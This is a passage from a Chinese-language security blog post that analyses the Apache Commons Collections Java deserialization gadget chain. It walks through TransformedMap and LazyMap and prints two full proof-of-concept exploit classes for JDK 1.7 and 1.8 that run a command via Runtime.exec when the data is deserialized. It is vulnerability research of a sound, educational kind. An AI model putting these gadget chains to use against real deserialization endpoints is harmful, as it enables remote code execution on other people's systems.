+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    map.put(<span class="string">"one"</span>,<span class="number">1</span>);</span><br><span class="line">    map.put(<span class="string">"two"</span>,<span class="number">2</span>);</span><br><span class="line">    map.put(<span class="string">"three"</span>,<span class="number">3</span>);</span><br><span class="line">    map.put(<span class="string">"four"</span>,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    Collection collection = map.values();</span><br><span class="line">    Iterator iterator = collection.iterator();</span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">        System.out.println(iterator.next());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x04-entrySet"><a href="#0x04-entrySet" class="headerlink" title="0x04 entrySet"></a>0x04 entrySet</h4><p>使用foreach map.entrySet()，用临时变量保存map.entrySet()</p>
+<p><strong>Demo</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">"one"</span>,<span class="number">1</span>);</span><br><span class="line">map.put(<span class="string">"two"</span>,<span class="number">2</span>);</span><br><span class="line">map.put(<span class="string">"three"</span>,<span class="number">3</span>);</span><br><span class="line">map.put(<span class="string">"four"</span>,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">Set&lt;Map.Entry&lt;String,Integer&gt;&gt; maps = map.entrySet();</span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String,Integer&gt; entry: maps)&#123;</span><br><span class="line">    System.out.println(<span class="string">"Key-Value is "</span>+entry.getKey()+<span class="string">"-"</span>+entry.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SetValue"><a href="#SetValue" class="headerlink" title="SetValue"></a>SetValue</h3><p>继续回来，POC用了entrySet()的方法去遍历HashMap</p>
+<p>先获取HashMap的键值对的Set集合，然后通过迭代器去遍历</p>
+<p>在最后修改value的时候，也就是setValue()，会去调用parent.checkSetValue()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进这方法</p>
+<p><img src="/2019/08/23/com/check.png" alt></p>
+<p>此处的value就是传入的chains，回到之前的逻辑了</p>
+<p>流程为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setValue ==&gt; checkSetValue ==&gt; valueTransformer.transform(value)</span><br></pre></td></tr></table></figure>
+
+<p>这里附上师傅的时序图</p>
+<p><img src="http://whip1ash.cn/media/15421147708792.jpg" alt></p>
+<h2 id="ReadObject-触发"><a href="#ReadObject-触发" class="headerlink" title="ReadObject 触发"></a>ReadObject 触发</h2><p>目前的POC还依赖于手动去调用setValue()，这样有点鸡肋，不过现在希望在反序列化数据时自动调用readObject()，触发Chains链</p>
+<h3 id="JDK1-7"><a href="#JDK1-7" class="headerlink" title="JDK1.7"></a>JDK1.7</h3><p>来看这个POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">common_collection5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>,<span class="string">"admin"</span>);</span><br><span class="line"></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap,<span class="keyword">null</span>,chain);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Object ins = cons.newInstance(java.lang.annotation.Retention<span class="class">.<span class="keyword">class</span>,<span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(ins);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重点是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个类，作为原生自带的，利用反射去实例化它，来看他重写之后的ReadObject()和构造方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    <span class="keyword">this</span>.type = var1;</span><br><span class="line">    <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造函数比较简单，将传入的<code>Retention.class</code>赋给type，<code>outMap</code>赋给memberValues</p>
+<p><img src="/2019/08/23/com/readobject.png" alt></p>
+<p>在逻辑的最后出现了令人惊喜的setValue()方法，Debug跟踪一下</p>
+<p><img src="/2019/08/23/com/value.png" alt></p>
+<p>方法最开始实例化了我们传入的<code>Retention.class</code>，然后调用他的memberTypes()方法。var3为一个键值对，key为字符串value，value为<code>class java.lang.annotation.RetentionPolicy</code>。然后var4创建了一个outermap键值对的Set集合的迭代器，所以在接下来的循环中，var6为key值也就是字符串”value”，var7就是var3调用的get(“value”)得到的<code>RetentionPolicy</code>，所以put的hashmap的<strong>键名必须为<code>value</code></strong>，否则var7为NULL，键值是除<code>RetentionPolicy</code>和<code>ExceptionProxy</code>之外的任意类对象就行</p>
+<p>var8自然就是字符串”admin”，进入if判断中，很明显字符串var8既不是<code>RetentionPolicy</code>的实例，也不是<code>ExceptionProxy</code>的实例，于是调用了setValue(transformedmap)，触发POP链</p>
+<p>但是在jdk1.8之后，就不会有这个setValue</p>
+<p><img src="/2019/08/23/com/jdk8.png" alt></p>
+<h3 id="JDK1-8"><a href="#JDK1-8" class="headerlink" title="JDK1.8"></a>JDK1.8</h3><p>但是在JDK1.8的时候，我们使用ysoserial中的CommonsCollections5的这条链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">common_collection6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// val是私有变量，所以利用下面方法进行赋值</span></span><br><span class="line">        Field valfield = poc.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(poc, entry);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(poc);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        Object object = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个POC有处比较大的变化是，使用了LazyMap的decorate()创建数组，于是乎我们来看下这条利用链</p>
+<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</span><br><span class="line">&#125;</span><br><span class="line">.....</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Factory factory)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的decorate()返回一个LazyMap实例化对象，然后调用构造方法去初始化factory属性，这个factory是传入的Transformer对象，可控的。来看get方法</p>
+<p><img src="/2019/08/23/com/get.png" alt></p>
+<p>如果传入的key是map中不存在的键名，就会往下走，调用<code>fatctory.transform()</code>，前者为可控的对象，从而去触发POP链。但是怎样调用get()方法呢？</p>
+<p>我们来看类<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code></p>
+<p><img src="/2019/08/23/com/tme.png" alt></p>
+<p>getValue调用了<code>map.get()</code>方法，并且在之后重写的的toString()中调用了<code>getValue()</code></p>
+<p>只要调用TiedMapEntry.toString()就能够去触发执行链。而这个toString()就类似于PHP中的魔术方法<code>__toString()</code>，当对象被当做字符串处理的时候会自动调用这个方法</p>
+<p>我们继续来看<code>javax.management.BadAttributeValueExpException</code>这个类的readObject()</p>
+<p><img src="/2019/08/23/com/bavee.png" alt></p>
+<p>下面这里直接调用了<code>valObj</code>的toString()方法，回溯这个valObj是传入的变量<code>val</code>，这变量是private的，不能直接外界赋值，但是可以通过反射的方式给他赋值为TiedMapEntry对象，这个对象与LazyMap有关，所以会去调用get()，触发POP链</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readObject() --&gt; TiedMapEntry.toString() --&gt; TiedMapEntry.getValue() --&gt; LazyMap.get() --&gt; ChainedTransformer.transform() --&gt; RCE</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.freebuf.com/vuls/175252.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/175252.html</a></p>
+<p><a href="http://whip1ash.cn/2018/11/11/java-deserialization-2/" target="_blank" rel="noopener">http://whip1ash.cn/2018/11/11/java-deserialization-2/</a></p>
+<p><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a></p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/09/02/rmi/" title= "RMI 反序列化漏洞简析">
+                    <div class="nextTitle">RMI 反序列化漏洞简析</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/07/30/jackson/" title= "Jackson 反序列化漏洞简析">
+                    <div class="prevTitle">Jackson 反序列化漏洞简析</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto://yujianan1998@gmail.com" target="_blank" rel="noopener" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/Yoga7xm" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/wechat.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POP-Chains"><span class="toc-number">2.</span> <span class="toc-text">POP Chains</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POP-链分析"><span class="toc-number">2.1.</span> <span class="toc-text">POP 链分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Runtime"><span class="toc-number">2.2.</span> <span class="toc-text">Runtime!!!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TransformedMap"><span class="toc-number">3.</span> <span class="toc-text">TransformedMap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#decorate"><span class="toc-number">3.1.</span> <span class="toc-text">decorate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap-遍历之术"><span class="toc-number">3.2.</span> <span class="toc-text">HashMap 遍历之术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-entrySet"><span class="toc-number">3.2.1.</span> <span class="toc-text">0x01 entrySet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-keySet"><span class="toc-number">3.2.2.</span> <span class="toc-text">0x02 keySet</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-values"><span class="toc-number">3.2.3.</span> <span class="toc-text">0x03 values</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-entrySet"><span class="toc-number">3.2.4.</span> <span class="toc-text">0x04 entrySet</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SetValue"><span class="toc-number">3.3.</span> <span class="toc-text">SetValue</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ReadObject-触发"><span class="toc-number">4.</span> <span class="toc-text">ReadObject 触发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JDK1-7"><span class="toc-number">4.1.</span> <span class="toc-text">JDK1.7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JDK1-8"><span class="toc-number">4.2.</span> <span class="toc-text">JDK1.8</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LazyMap"><span class="toc-number">4.2.1.</span> <span class="toc-text">LazyMap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 47
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/30</span><a class="archive-post-title" href= "/2019/09/30/http/" >HTTP 请求走私</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href= "/2019/09/02/rmi/" >RMI 反序列化漏洞简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2019/08/23/com/" >Commons-Collections 反序列化简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href= "/2019/07/30/jackson/" >Jackson 反序列化漏洞简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href= "/2019/07/20/fastjson/" >Fastjson 反序列化漏洞简析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/23</span><a class="archive-post-title" href= "/2019/06/23/met1/" >Metinfo6.13 两处XSS漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href= "/2019/06/14/suid/" >Linux Suid提权</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span><a class="archive-post-title" href= "/2019/06/06/phpbb/" >phpBB 反序列化漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href= "/2019/06/04/phar/" >PHP反序列化之phar</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href= "/2019/06/01/typecho/" >Typecho 反序列化RCE漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href= "/2019/05/28/rfi-getshell/" >RFI Getshell By SMB & WebDav</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/20</span><a class="archive-post-title" href= "/2019/05/20/basedir/" >Open_basedir Bypass</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/15</span><a class="archive-post-title" href= "/2019/05/15/disable/" >disable_funcions Bypass</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
